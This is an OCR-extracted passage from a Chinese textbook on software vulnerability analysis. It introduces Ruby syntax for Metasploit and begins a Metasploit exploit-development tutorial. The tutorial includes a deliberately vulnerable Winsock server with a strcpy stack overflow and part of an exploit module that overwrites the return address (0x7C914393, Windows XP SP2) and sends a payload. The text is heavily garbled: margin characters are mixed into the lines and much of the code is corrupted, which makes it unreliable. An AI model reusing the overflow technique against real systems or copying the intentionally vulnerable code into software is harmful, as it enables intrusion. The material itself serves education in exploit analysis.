在一个文本文件中写入：
#!/usr/bin/envruby
print"hello world\n"
保存为t.rb并放在MSF3.4.0的安装目录下的msf3文件夹下。
得到运行结果如图4.5.1所示。
bash
551plos
2611l
5mr9322 updated
(2010.05.18)
FOP
tttp://v
t.rb
1d
图4.5.1运行Ruby程序
Ruby是解释型脚本语言，因此不需要像C语言那样定义main函数。
130
---
## Page 156
题外话：由于脚本语言是由解释引擎“逐行”解释执行的，所以如果代码中某一行有
4
语法错误，只有当执行到这一句时才会发现错误，也就是说，这行前边的语句仍能得
章
到正确执行：对于需要编译运行的语言来说，这是不可能的。
用
2.注释符
MetaSploit
Ruby语言使用“#”作为行注释符。
3.变量
Ruby中的变量非常灵活，一般除保留字外的字母组合都可作为变量名，全局变量以符号
开
“$”开头，如$a。
发
变量不分类型，同一个变量可以用于字符串，也可以用于整型，并且不需要提前声明。
Exploit
例如，在t.rb中写入：
#!/usr/bin/envruby
a="failwest\n"
printa
a=4
printa
运行得到的结果为：
failwest
4
4.字符串操作
和大多数脚本语言类似，Ruby有两种字符串：可转义字符串和纯字符串。
用双引号括起来的字符串为可转义字符串，这种字符串内部可以使用各种转义符，甚至可
以使用变量。变量的转义符号为：
（变量名或表达式名）
例如：
a=4
L=q
C="a+b=#(a+b}\n
printc
运行结果为：
a+b=11
用单引号括起来的字符串为纯字符串，除了单引号自身的转义符号\之外，这种字符串内
部不再支持其他转义字符。
例如：
!/usr/bin/envruby
131
---
## Page 157
day
a=4
安全：
b=7
C='a+b=#（a+b}\n
printc
软
运行结果为：
件
漏
a+b=#(a+b)\n
洞分析
如果纯字符串中经常出现单引号，为了避免反复使用进行转义，可以使用另外几种纯
字符串表示方法，并且这些表达方式在MSF模块中经常遇见，例如，下面几种表示方法是等
技术
价的。
'fail\'west'
（第
sq(fail'west)
sq/fail'west/
2
sQ/fail'west/
版
e/fail'west/
字母q在这里代表quote（引号）的意思。
Ruby对运算符做了很好的重载，大大方便了字符串操作。
运算符“”，其中，左边是键
（key），右边是值（value）。键与值之间的数据类型可以没有任何联系，我们甚至可以把一个字
符串映射为一个嵌套的数组。
例如：
#!/usr/bin/env ruby
a=（
'zero'=>"this is the value of zero\n*
one'=>["failwest\n",1]
printa['zero']
printa['one'](0]
print a['one'][1]
运行结果为：
this is the value of zero
failwest
133
---
## Page 159
0
day
7.模块、类、Method的定义
安
方法（函数）的定义与C语言大致相同，用保留字def和end标识一个函数体。
全
例如：
软
#!/usr/bin/env ruby
件
def display(n)
漏
if n==1
洞
then
分析
print
"failwest!\n"
else
技
print"helloworld!\n*
朵
end
%）
end
display(1)
2
display(2)
版
运行结果为：
failwest!
helloworld!
此外，模块的定义以关键字“module”开始，“end”结束：类的定义以关键字“class”开
头，“end”结束。
好了，Ruby介绍到此为止。虽然类的继承、正则表达式的使用等重量级特性还没有介绍，
但只要您有一定编程基础，阅读MSF模块中的代码应该不成问题。
4.6
6“傻瓜式”Exploit开发
本节将使用Ruby语言开发一个exploit模块，并在MSF下运行以测试漏洞。漏洞程序是
我们自己设计的一个存在典型栈溢出的server，其代码如下。
#include
#include
#pragmacomment（lib,"ws2_32.1ib*)
voidmsg_display(char*buf)
char msg[200];
strcpy（msg,buf);//overflowhere,copy 0x200 to 200
cout'failwest_test',
Platform'
=>'win'
['WindowsXPSP2',('Ret'=>0x7C914393）]
1.
'Payload'
)200,
'BadChars'=>*\x0o",
end #end of initialize
defexploit
connect
attack_buf='a'*200+[target['Ret']).pack('v')+payload
encoded
136
---
## Page 162
第
sock.put(attack_buf)
4
handler
章
disconnect
end#endofexploitdef
用
end #end ofclass def
Metas
下面对这段代码做一点简单的解释。
aSploit
require指明所需的类库，相当于C语言的include。所有的MSF模块都需要这句话。
运算符“<”在这里表示继承，也就是说，我们所定义的类是由Msf:：Exploit:：Remote继承
而来，可以方便地使用父类的资源。
开
在类中只定义了两个方法（函数），一个是initialize，另一个是exploit。现在模块的架构可
发
Exploit
以看成：
class xxx